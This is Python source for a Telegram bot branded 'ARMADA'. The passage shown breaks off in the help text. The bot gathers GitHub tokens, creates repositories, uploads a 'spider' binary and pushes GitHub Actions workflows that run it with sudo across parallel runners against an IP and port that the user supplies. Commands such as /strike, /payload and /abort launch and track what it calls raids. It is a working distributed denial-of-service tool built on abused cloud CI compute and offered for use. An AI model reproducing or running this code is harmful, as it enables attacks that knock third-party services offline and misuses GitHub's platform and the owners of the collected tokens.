import os
import json
import logging
import time
import uuid
import asyncio
import random
import traceback
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
RUNNERS_PER_ATTACK = int(os.environ.get("RUNNERS_PER_ATTACK", "10"))
THREADS_PER_RUNNER = int(os.environ.get("THREADS_PER_RUNNER", "200"))
MAX_REPOS_PER_ATTACK = int(os.environ.get("MAX_REPOS_PER_ATTACK", "5"))
TOKEN_RATE_LIMIT_THRESHOLD = int(os.environ.get("TOKEN_RATE_LIMIT_THRESHOLD", "50"))

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}
token_usage = {}

# ============================================================
# ===== ASCII BANNERS (PRO TERMINAL STYLE) =====
# ============================================================
BANNER_ARMADA = """
┌──────────────────────────────────────────────────────────────────────┐
│  █████╗ ██████╗ ███╗   ███╗ █████╗ ██████╗  █████╗                 │
│ ██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗██╔══██╗                │
│ ███████║██████╔╝██╔████╔██║███████║██║  ██║███████║                │
│ ██╔══██║██╔══██╗██║╚██╔╝██║██╔══██║██║  ██║██╔══██║                │
│ ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║                │
│ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝                │
│                                                                      │
│           [✦]  SYSTEM INITIALIZED  [✦]                               │
│           ⚡ ULTIMATE STRIKE TERMINAL v3.0 ⚡                        │
└──────────────────────────────────────────────────────────────────────┘
"""

BANNER_STRIKE = """
┌────────────────────────────────────────────────────────────┐
│  ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗             │
│  ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝             │
│  ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗               │
│  ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝               │
│  ███████║   ██║   ██║  ██║██║██║  ██╗███████╗             │
│  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝             │
│                                                            │
│              [☠]  DEPLOYING STRIKE  [☠]                    │
└────────────────────────────────────────────────────────────┘
"""

BANNER_PAYLOAD = """
┌────────────────────────────────────────────────────────────┐
│  ██╗  ██╗██╗██╗   ██╗███████╗                             │
│  ██║  ██║██║╚██╗ ██╔╝██╔════╝                             │
│  ███████║██║ ╚████╔╝ █████╗                               │
│  ██╔══██║██║  ╚██╔╝  ██╔══╝                               │
│  ██║  ██║██║   ██║   ███████╗                             │
│  ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝                             │
│                                                            │
│              [📡]  LIVE FEED  [📡]                         │
└────────────────────────────────────────────────────────────┘
"""

BANNER_MATRIX = """
┌────────────────────────────────────────────────────────────┐
│  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░ │
│  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██ │
│  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░ │
│  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██ │
│  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░ │
│  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██  ██▓▓▒▒░░  ░░▒▒▓▓██ │
│                                                            │
│           [🌀]  WAKE UP, NEO...  [🌀]                      │
└────────────────────────────────────────────────────────────┘
"""

# ============================================================
# ===== SAFE FILE OPS =====
# ============================================================
def load_json(filename, default=None):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ============================================================
# ===== INIT =====
# ============================================================
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== TOKEN MANAGER =====
# ============================================================
class TokenManager:
    def __init__(self, tokens_list):
        self.tokens = tokens_list
        self.in_use = {}
        self.ratelimit_cache = {}

    def _validate_token(self, token):
        try:
            g = Github(token)
            user = g.get_user()
            _ = user.login
            rate = g.get_rate_limit()
            remaining = rate.core.remaining
            return True, remaining, user.login
        except:
            return False, 0, None

    def health_check(self):
        global github_tokens
        valid = []
        for td in github_tokens:
            token = td.get('token')
            if not token:
                continue
            ok, remaining, username = self._validate_token(token)
            if ok:
                td['username'] = username
                td['remaining'] = remaining
                valid.append(td)
            else:
                logger.warning(f"🗑️ Removed invalid token: {token[:10]}...")
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        self.in_use = {td['token']: 0 for td in github_tokens}
        self.ratelimit_cache = {td['token']: td.get('remaining', 1000) for td in github_tokens}
        return len(valid)

    def get_healthy_tokens(self, max_count, exclude=[]):
        healthy = []
        candidates = [td for td in github_tokens if td['token'] not in exclude]
        candidates.sort(key=lambda x: x.get('remaining', 0), reverse=True)
        for td in candidates:
            token = td['token']
            if token in exclude:
                continue
            remaining = td.get('remaining', 0)
            if remaining < TOKEN_RATE_LIMIT_THRESHOLD:
                continue
            if self.in_use.get(token, 0) < 2:
                healthy.append(td)
                if len(healthy) >= max_count:
                    break
        if len(healthy) < max_count:
            for td in candidates:
                if td not in healthy:
                    healthy.append(td)
                    if len(healthy) >= max_count:
                        break
        return healthy

    def mark_used(self, token):
        self.in_use[token] = self.in_use.get(token, 0) + 1

    def mark_released(self, token):
        if token in self.in_use:
            self.in_use[token] = max(0, self.in_use[token] - 1)

token_manager = TokenManager(github_tokens)

# ============================================================
# ===== HELPERS: FORMATTING (PRO INTERFACE) =====
# ============================================================
def threat_level(seconds):
    if seconds <= 60:
        return "🟢 MODERATE"
    elif seconds <= 300:
        return "🟡 HIGH"
    else:
        return "🔴 CRITICAL"

def progress_bar(elapsed, total, width=20):
    if total <= 0:
        return "▓" * width
    progress = int((elapsed / total) * width)
    if progress > width:
        progress = width
    return "▓" * progress + "░" * (width - progress)

def format_terminal_box(lines, title=None):
    """Wrap a list of lines into a terminal box."""
    max_len = max(len(l) for l in lines) if lines else 40
    border = "┌" + "─" * (max_len + 2) + "┐"
    bottom = "└" + "─" * (max_len + 2) + "┘"
    result = [border]
    if title:
        result.append(f"│ {title.center(max_len)} │")
        result.append("├" + "─" * (max_len + 2) + "┤")
    for line in lines:
        result.append(f"│ {line.ljust(max_len)} │")
    result.append(bottom)
    return "\n".join(result)

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ============================================================
# ===== ATTACK MANAGEMENT =====
# ============================================================
def start_attack(attack_id, targets, user_id, duration):
    active_attacks[attack_id] = {
        "targets": targets,
        "user_id": user_id,
        "start_time": time.time(),
        "duration": duration,
        "timer_task": None
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        for t in active_attacks[attack_id].get("targets", []):
            token_manager.mark_released(t['token'])
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== VALIDATION =====
# ============================================================
def validate_github_token(token):
    try:
        if not token or len(token) < 20:
            return False, "Token too short"
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted"
        return True, user.login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)"
        elif e.status == 403:
            return False, "Rate limited (403)"
        elif e.status == 404:
            return False, "Token has no permissions (404)"
        else:
            return False, f"GitHub error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:40]}"

def auto_remove_expired():
    return token_manager.health_check()

# ============================================================
# ===== BINARY UPLOAD =====
# ============================================================
async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b> – only system admins can deploy binaries.", parse_mode='HTML')
            return ConversationHandler.END
        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("❌ <b>Token Vault Empty</b>\nAdd tokens via <code>/inject</code> or <code>/addtoken</code>", parse_mode='HTML')
            return ConversationHandler.END
        await update.message.reply_text(
            "📤 <b>DEPLOY BINARY</b>\n\n"
            "Send me the <code>spider</code> binary file.\n"
            "File must be named exactly: <code>spider</code>\n"
            "Type <code>/cancel</code> to abort.",
            parse_mode='HTML'
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return ConversationHandler.END
        if not update.message.document:
            await update.message.reply_text("❌ Please send a file.", parse_mode='HTML')
            return WAITING_FOR_BINARY
        file = update.message.document
        if file.file_name != "spider":
            await update.message.reply_text(f"❌ File must be named <code>spider</code>. Found: <code>{file.file_name}</code>", parse_mode='HTML')
            return WAITING_FOR_BINARY
        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens. Add with /inject or /addtoken", parse_mode='HTML')
            return ConversationHandler.END

        progress = await update.message.reply_text("⏳ <b>Uploading to all repositories...</b>", parse_mode='HTML')
        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)

        success_count = 0
        fail_count = 0
        results = []
        for token_data in github_tokens:
            token = token_data.get('token')
            repo_name = token_data.get('repo')
            username = token_data.get('username', 'unknown')
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    existing = repo.get_contents("spider")
                    repo.update_file("spider", "Update spider binary", content, existing.sha)
                    results.append((username, True, "✅ Updated"))
                except Exception:
                    repo.create_file("spider", "Add spider binary", content)
                    results.append((username, True, "✅ Created"))
                success_count += 1
            except Exception as e:
                results.append((username, False, f"❌ {str(e)[:40]}"))
                fail_count += 1

        msg = f"<b>✅ BINARY DEPLOYMENT COMPLETE</b>\n"
        msg += f"📊 Success: {success_count} | Failed: {fail_count} | Total: {len(github_tokens)}\n"
        for username, success, status in results:
            emoji = "✅" if success else "❌"
            msg += f"{emoji} @{username}: {status}\n"
        await progress.edit_text(msg, parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN COMMANDS (NEW + OLD ALIASES) =====
# ============================================================
async def inject_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/inject or /addtoken <github_token>"""
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b> – only admins can inject tokens.", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 <b>Usage:</b> <code>/inject &lt;github_token&gt;</code> (or /addtoken)", parse_mode='HTML')
            return
        token = context.args[0].strip()
        is_valid, info = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"❌ <b>Invalid Token</b>\n{info}", parse_mode='HTML')
            return
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("⚠️ Token already exists in vault.", parse_mode='HTML')
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(
                    f"⚠️ User @{username} already has a token.\n"
                    f"Existing repo: <code>{t.get('repo')}</code>\n"
                    f"Remove it first with <code>/eject</code> or <code>/removetoken</code>.",
                    parse_mode='HTML'
                )
                return
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False)
        try:
            repo.create_file(".github/workflows/main.yml", "Init workflow", "")
        except:
            pass
        new_entry = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat()
        }
        github_tokens.append(new_entry)
        save_json('github_tokens.json', github_tokens)
        token_manager.health_check()
        await update.message.reply_text(
            f"<b>🔑 TOKEN INJECTED</b>\n"
            f"👤 User: @{username}\n"
            f"📁 Repo: <code>{repo_name}</code>\n"
            f"📊 Vault size: {len(github_tokens)}",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def vault_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/vault or /tokens"""
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        removed = token_manager.health_check()
        if not github_tokens:
            msg = "📭 <b>Token Vault Empty</b>"
            if removed > 0:
                msg = f"🧹 Removed {removed} expired tokens.\n📭 Vault is now empty."
            await update.message.reply_text(msg, parse_mode='HTML')
            return
        msg = "<b>🔐 TOKEN VAULT</b>\n\n"
        if removed > 0:
            msg += f"🧹 Removed {removed} expired tokens\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            remaining = t.get('remaining', '?')
            msg += f"{i}. @{t.get('username', 'Unknown')} – <code>{token_short}</code> (remaining: {remaining})\n"
            msg += f"   📁 <code>{t['repo']}</code>\n\n"
        msg += f"📊 Total valid: {len(github_tokens)}"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def scan_tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/scan or /checktokens"""
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("📭 No tokens to scan.", parse_mode='HTML')
            return
        removed = token_manager.health_check()
        msg = "<b>🔍 TOKEN HEALTH SCAN</b>\n\n"
        msg += f"📊 Total: {len(github_tokens)}\n"
        msg += f"🧹 Expired removed: {removed}\n\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            remaining = t.get('remaining', 'N/A')
            status = "🟢" if remaining > TOKEN_RATE_LIMIT_THRESHOLD else "🟡" if remaining > 10 else "🔴"
            msg += f"{i}. {status} @{t.get('username', 'Unknown')} – <code>{token_short}</code> (remaining: {remaining})\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def eject_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/eject or /removetoken <token>"""
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/eject &lt;token&gt;</code> (or /removetoken)", parse_mode='HTML')
            return
        token = context.args[0]
        found = False
        for i, t in enumerate(github_tokens):
            if t.get('token') == token:
                github_tokens.pop(i)
                save_json('github_tokens.json', github_tokens)
                token_manager.health_check()
                found = True
                break
        if found:
            await update.message.reply_text(f"✅ Token ejected. Remaining: {len(github_tokens)}", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Token not found.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def purge_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/purge or /cleartokens confirm"""
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("📭 Vault already empty.", parse_mode='HTML')
            return
        count = len(github_tokens)
        if len(context.args) == 1 and context.args[0].lower() == "confirm":
            github_tokens.clear()
            save_json('github_tokens.json', github_tokens)
            token_manager.health_check()
            await update.message.reply_text(f"🗑️ Purged {count} tokens.", parse_mode='HTML')
        else:
            await update.message.reply_text(f"⚠️ Delete ALL {count} tokens? Use <code>/purge confirm</code> (or /cleartokens confirm)", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== STRIKE COMMAND (NEW + OLD ALIAS) =====
# ============================================================
async def strike_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/strike or /attack <ip> <port> <time>"""
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b>\nYou don't have permission to launch strikes.", parse_mode='HTML')
            return
        if len(context.args) != 3:
            await update.message.reply_text(
                "📖 <b>Usage:</b> <code>/strike &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code> (or /attack)\n\n"
                "💡 Example: <code>/strike 1.1.1.1 443 60</code>\n"
                "⏱️ Time range: 5 – 3600 seconds\n"
                f"⚙️ Will use up to {MAX_REPOS_PER_ATTACK} repositories simultaneously.",
                parse_mode='HTML'
            )
            return

        ip, port_str, time_str = context.args
        try:
            port = int(port_str)
            time_val = int(time_str)
        except:
            await update.message.reply_text("❌ <b>Invalid Input</b>\nPort and time must be numbers.", parse_mode='HTML')
            return
        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ <b>Invalid Port</b>\nPort must be between 1 and 65535.", parse_mode='HTML')
            return
        if time_val < 5 or time_val > 3600:
            await update.message.reply_text("❌ <b>Invalid Duration</b>\nTime must be 5–3600 seconds.", parse_mode='HTML')
            return

        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("❌ <b>No GitHub Tokens</b>\nAdd one with <code>/inject</code> or <code>/addtoken</code>", parse_mode='HTML')
            return

        healthy_tokens = token_manager.get_healthy_tokens(MAX_REPOS_PER_ATTACK)
        if not healthy_tokens:
            await update.message.reply_text("❌ <b>No healthy tokens available</b>\nCheck /scan or /checktokens", parse_mode='HTML')
            return

        attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
        deployed = []
        failed = []

        for token_data in healthy_tokens:
            token = token_data['token']
            repo_name = token_data['repo']
            username = token_data['username']
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    repo.get_contents("spider")
                except:
                    failed.append((username, "Binary missing"))
                    continue

                yml_content = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [{','.join([str(i) for i in range(1, RUNNERS_PER_ATTACK+1)])}]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {time_val} {THREADS_PER_RUNNER}
"""
                try:
                    file = repo.get_contents(YML_FILE_PATH)
                    repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
                except:
                    try:
                        repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
                    except:
                        repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml_content)

                deployed.append({
                    "username": username,
                    "repo": repo_name,
                    "token": token,
                    "actions_url": f"https://github.com/{repo_name}/actions"
                })
                token_manager.mark_used(token)
                logger.info(f"✅ Deployed attack to {repo_name}")

            except Exception as e:
                failed.append((username, str(e)[:40]))
                logger.error(f"Failed on {repo_name}: {e}")

        if not deployed:
            await update.message.reply_text(
                "❌ <b>Deployment Failed</b>\nCould not deploy to any repository.\n"
                f"Errors: {failed[:3]}",
                parse_mode='HTML'
            )
            return

        start_attack(attack_id, deployed, user_id, time_val)

        async def auto_finish():
            await asyncio.sleep(time_val + 10)
            finish_attack(attack_id)
            logger.info(f"✅ Auto-finished attack {attack_id}")
        timer_task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = timer_task

        # ===== PRO TERMINAL OUTPUT =====
        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        finish_time = (datetime.now() + timedelta(seconds=time_val)).strftime("%Y-%m-%d %H:%M:%S")
        total_threads = len(deployed) * RUNNERS_PER_ATTACK * THREADS_PER_RUNNER
        threat = threat_level(time_val)

        banner = BANNER_STRIKE
        msg = f"<b>{banner}</b>\n\n"
        msg += f"<pre>\n"
        msg += f"┌────────────────────────────────────────────────────────────────────────┐\n"
        msg += f"│  🎯 TARGET          │  {ip}:{port}                                             │\n"
        msg += f"│  ⏱️ DURATION        │  {time_val}s                                              │\n"
        msg += f"│  📦 REPOSITORIES    │  {len(deployed)} (max {MAX_REPOS_PER_ATTACK})                               │\n"
        msg += f"│  ⚙️ RUNNERS/REPO   │  {RUNNERS_PER_ATTACK} × {THREADS_PER_RUNNER} threads                         │\n"
        msg += f"│  🔥 TOTAL THREADS  │  {total_threads}                                             │\n"
        msg += f"│  🆔 STRIKE ID      │  {attack_id} │\n"
        msg += f"│  🕒 LAUNCHED AT    │  {start_time}                                      │\n"
        msg += f"│  ⏳ ETA            │  {finish_time}                                      │\n"
        msg += f"│  ⚡ THREAT LEVEL   │  {threat}                                             │\n"
        msg += f"└────────────────────────────────────────────────────────────────────────┘\n"
        msg += f"</pre>\n"
        msg += f"<b>📡 Live Feeds:</b>\n"
        for d in deployed:
            msg += f"• <a href='{d['actions_url']}'>@{d['username']}</a> (repo: {d['repo']})\n"
        msg += f"\n🛑 <b>Abort:</b> Use <code>/abort</code> or <code>/stop</code> to terminate all runs.\n"
        msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += f"<i>🚀 Strike #{attack_counters.get(str(user_id), 0)} launched. Firepower multiplied across {len(deployed)} repos.</i>"
        await update.message.reply_text(msg, parse_mode='HTML', disable_web_page_preview=True)

    except Exception as e:
        await update.message.reply_text(f"❌ <b>Deployment Failed</b>\n<code>{str(e)[:200]}</code>", parse_mode='HTML')

# ============================================================
# ===== PAYLOAD (Status) COMMAND (NEW + OLD ALIAS) =====
# ============================================================
async def payload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/payload or /status – Live feed"""
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return

        if not active_attacks:
            await update.message.reply_text(
                f"<b>{BANNER_PAYLOAD}</b>\n\n"
                "<pre>\n"
                "┌─────────────────────────────────────────────────────┐\n"
                "│  STATUS      :  🟢 IDLE                           │\n"
                "│  ACTIVE RAIDS:  0                                │\n"
                "│  FIREPOWER   :  0 Threads                        │\n"
                "└─────────────────────────────────────────────────────┘\n"
                "</pre>\n"
                "<i>No active strikes. Deploy one with /strike or /attack</i>",
                parse_mode='HTML'
            )
            return

        total_threads = 0
        msg = f"<b>{BANNER_PAYLOAD}</b>\n\n"
        msg += "<pre>\n"
        msg += "┌────────────────────────────────────────────────────────────────────────┐\n"
        msg += f"│  TOTAL RAIDS :  {len(active_attacks)}                                                  │\n"
        for aid, data in active_attacks.items():
            targets = data.get("targets", [])
            duration = data.get('duration', 60)
            elapsed = int(time.time() - data['start_time'])
            remaining = duration - elapsed
            if remaining < 0:
                remaining = 0
            bar = progress_bar(elapsed, duration, width=25)
            total_threads += len(targets) * RUNNERS_PER_ATTACK * THREADS_PER_RUNNER
            if targets:
                first = targets[0]
                msg += f"│  🎯 {first.get('ip', '?')}:{first.get('port', '?')}                                               │\n"
                msg += f"│     ⏱️  {bar}  {elapsed}s / {duration}s (Rem: {remaining}s) │\n"
                msg += f"│     📦 {len(targets)} repos                                     │\n"
                msg += "├────────────────────────────────────────────────────────────────────────┤\n"
        msg += f"│  TOTAL FIREPOWER :  {total_threads} Threads                              │\n"
        msg += "└────────────────────────────────────────────────────────────────────────┘\n"
        msg += "</pre>\n"
        msg += f"<i>🛑 Use /abort or /stop to terminate all missions.</i>"
        await update.message.reply_text(msg, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== ABORT (Stop) COMMAND (NEW + OLD ALIAS) =====
# ============================================================
async def abort_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/abort or /stop"""
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not active_attacks:
            await update.message.reply_text("✅ No active raids to abort.", parse_mode='HTML')
            return
        count = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        await update.message.reply_text(
            f"<b>🛑 ABORT MISSION</b>\n\n"
            f"💥 Terminated <b>{count}</b> raid(s) successfully.\n"
            f"☠️ System is now idle. All clear.",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== START COMMAND (PRO DASHBOARD) =====
# ============================================================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        total_attacks = sum(attack_counters.values())
        user_attacks = attack_counters.get(str(user_id), 0)

        if can_attack(user_id):
            keyboard = [
                [InlineKeyboardButton("⚡ Launch Strike", callback_data="strike_help")],
                [InlineKeyboardButton("📡 Live Feed", callback_data="payload")],
                [InlineKeyboardButton("🛑 Abort Mission", callback_data="abort")],
            ]
            if is_owner(user_id):
                keyboard.append([InlineKeyboardButton("🔧 Admin Console", callback_data="admin_panel")])

            banner = BANNER_ARMADA
            await update.message.reply_text(
                f"<b>{banner}</b>\n\n"
                f"<pre>\n"
                f"┌────────────────────────────────────────────────────────────────────────┐\n"
                f"│  👤 OPERATOR    :  @{username:<12}                                     │\n"
                f"│  🎯 ROLE        :  {'👑 OWNER' if is_owner(user_id) else '✅ APPROVED':<12}              │\n"
                f"│  ⚙️ WORKERS     :  {RUNNERS_PER_ATTACK} / Repo                                  │\n"
                f"│  🧵 THREADS     :  {THREADS_PER_RUNNER} / Worker                               │\n"
                f"│  📦 REPOS       :  {MAX_REPOS_PER_ATTACK} Parallel                              │\n"
                f"│  🔥 TOTAL LOAD  :  {RUNNERS_PER_ATTACK * THREADS_PER_RUNNER * MAX_REPOS_PER_ATTACK} Threads │\n"
                f"│  📡 STATUS      :  🟢 ONLINE                                              │\n"
                f"│  🚀 YOUR STRIKES:  {user_attacks:<5}                                                 │\n"
                f"│  🌍 TOTAL RAIDS :  {total_attacks:<5}                                                 │\n"
                f"└────────────────────────────────────────────────────────────────────────┘\n"
                f"</pre>\n"
                f"<b>Quick Deploy:</b> <code>/strike &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code> (or /attack)\n"
                f"<i>Type /help for all commands (new + old).</i>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
                pending_users.append({"user_id": user_id, "username": username, "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                save_json('pending_users.json', pending_users)
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            int(owner_id),
                            f"📥 <b>Access Request</b>\n"
                            f"👤 @{username}\n"
                            f"🆔 <code>{user_id}</code>\n"
                            f"Use: <code>/grant {user_id} 7</code> (or /approve)",
                            parse_mode='HTML'
                        )
                    except:
                        pass
            await update.message.reply_text(
                "⛔ <b>Access Denied</b>\n\n"
                "Your request has been submitted to the system admin.\n"
                "Please wait for approval.\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "<i>Stay tuned.</i>",
                parse_mode='HTML'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== HELP COMMAND (NEW + OLD MAPPING) =====
# ============================================================
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>🤖 ARMADA – COMMAND REFERENCE</b>\n\n"
